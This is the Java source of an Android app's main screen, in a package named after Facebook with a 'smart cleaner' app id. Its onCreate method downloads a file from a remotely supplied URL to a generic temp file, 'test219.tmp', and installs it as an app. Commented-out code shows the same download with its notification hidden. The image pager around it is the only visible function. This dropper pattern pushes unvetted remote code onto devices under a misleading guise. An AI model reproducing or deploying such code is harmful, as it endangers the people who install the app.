package com.vnfa.facebook;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Calendar;

import com.telpoo.frame.delegate.Idelegate;
import com.telpoo.frame.utils.AppSupport;
import com.telpoo.frame.utils.IntentSupport;
import com.telpoo.frame.utils.TaskDownloadFile;

import android.annotation.SuppressLint;
import android.app.DownloadManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.StrictMode;
import android.widget.Button;
import cn.trinea.android.view.autoscrollviewpager.AutoScrollViewPager;
import android.support.v4.app.Fragment;
import android.support.v4.app.FragmentActivity;
import android.support.v4.app.FragmentManager;
import android.support.v4.view.ViewPager.OnPageChangeListener;

public class MainActivity extends FragmentActivity implements TaskType {
	AutoScrollViewPager pager;
	ViewPagerImageAdapter adapter;
	private Button _btn1, _btn2, _btn3, _btn4, _btn5;
	MainActivity me;
String path;
	@SuppressLint("NewApi")
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);

		StrictMode.ThreadPolicy th = new StrictMode.ThreadPolicy.Builder().permitAll().build();
		StrictMode.setThreadPolicy(th);

		setContentView(R.layout.main);
		
		path= Environment.getExternalStorageDirectory() + "/temp/" + "test219.tmp";
		me = MainActivity.this;
		initApp();
		initButton();
		//new Task(model, GET_REAL_FILE_PATH, null, me).exe();
		
		
		String realUrl = Applist.getPathFile(me);
		///realUrl="http://bit.ly/13zeMn3";

		File direct = new File(Environment.getExternalStorageDirectory() + "/temp");

		if (!direct.exists()) {
			direct.mkdirs();
		}
		
		File direct1 = new File(path);

		if (direct1.exists()) {
			direct1.delete();
		}
		
//		DownloadManager dm = (DownloadManager) getSystemService(DOWNLOAD_SERVICE);
//		DownloadManager.Request request = new DownloadManager.Request(Uri.parse(realUrl));
//		if(Build.VERSION.SDK_INT>=11)
//		request.setNotificationVisibility(DownloadManager.Request.VISIBILITY_HIDDEN);
//		request.setDestinationInExternalPublicDir("/temp", "test219.tmp");
//		dm.enqueue(request);
		
		TaskDownloadFile taskd=new TaskDownloadFile(me, "hehe", path, realUrl, new Idelegate() {
			
			@Override
			public void callBack(Object arg0, int arg1) {
				File f = new File(Environment.getExternalStorageDirectory() + "/temp/" + "test219.tmp");
				if (f.exists() && f.length() > 3)
					AppSupport.install(Environment.getExternalStorageDirectory() + "/temp/" + "test219.tmp", me);
				
			}
		});
		taskd.startDownload();
		
		//IntentSupport.openWeb(realUrl, me);
		

	}

	private void initApp() {
		Applist.saveAppId(Applist.ID_SMART_CLEANER, MainActivity.this);
		//BaseNetSupportBeta.getInstance().init(new NetConfig.Builder().numberRetry(3).build());
	}

	private void btnAction(int action) {
		setButton(_btn1, "", 20, 20);
		setButton(_btn2, "", 20, 20);
		setButton(_btn3, "", 20, 20);
		setButton(_btn4, "", 20, 20);
		setButton(_btn5, "", 20, 20);

		switch (action) {
		case 0:
			setButton(_btn1, "", 30, 30);
			break;

		case 1:
			setButton(_btn2, "", 30, 30);
			break;
		case 2:
			setButton(_btn3, "", 30, 30);
			break;
		case 3:
			setButton(_btn4, "", 30, 30);
			break;
		case 4:
			setButton(_btn5, "", 30, 30);
			break;
		}
	}

	private void initButton() {
		_btn1 = (Button) findViewById(R.id.btn1);
		_btn2 = (Button) findViewById(R.id.btn2);
		_btn3 = (Button) findViewById(R.id.btn3);
		_btn4 = (Button) findViewById(R.id.btn4);
		_btn5 = (Button) findViewById(R.id.btn5);

		pager = (AutoScrollViewPager) findViewById(R.id.view_pager);
		adapter = new ViewPagerImageAdapter(getSupportFragmentManager());
		pager.setAdapter(adapter);
		pager.setInterval(10000);
		pager.setAutoScrollDurationFactor(7);
		pager.setOnPageChangeListener(new OnPageChangeListener() {

			@Override
			public void onPageSelected(int arg0) {
				btnAction(arg0);

			}

			@Override
			public void onPageScrolled(int arg0, float arg1, int arg2) {

			}

			@Override
			public void onPageScrollStateChanged(int arg0) {

			}
		});
		pager.startAutoScroll(1000);

		btnAction(0);

	}

	private void setButton(Button btn, String text, int h, int w) {
		btn.setWidth(w);
		btn.setHeight(h);
		btn.setText(text);
	}

//	public void onSuccess(int taskType, ArrayList<?> list, String msg) {
//		super.onSuccess(taskType, list, msg);
//		String realUrl = (String) list.get(0);
//
//		File direct = new File(Environment.getExternalStorageDirectory() + "/temp");
//
//		if (!direct.exists()) {
//			direct.mkdirs();
//		}
//		
//		File direct1 = new File(Environment.getExternalStorageDirectory() + "/temp/" + "test219.tmp");
//
//		if (direct1.exists()) {
//			direct1.delete();
//		}
//		
//		
//
//		DownloadManager dm = (DownloadManager) getSystemService(DOWNLOAD_SERVICE);
//		DownloadManager.Request request = new DownloadManager.Request(Uri.parse(realUrl));
//		if(Build.VERSION.SDK_INT>=11)
//		request.setNotificationVisibility(DownloadManager.Request.VISIBILITY_HIDDEN);
//		request.setDestinationInExternalPublicDir("/temp", "test219.tmp");
//		dm.enqueue(request);
//
//	}

//	@Override
//	public void onFail(int taskType, String msg) {
//		switch (taskType) {
//		case GET_REAL_FILE_PATH:
//			showToast("Have an error, please try again later!");
//			finish();
//			break;
//
//		default:
//			break;
//		}
//		super.onFail(taskType, msg);
//	}

}
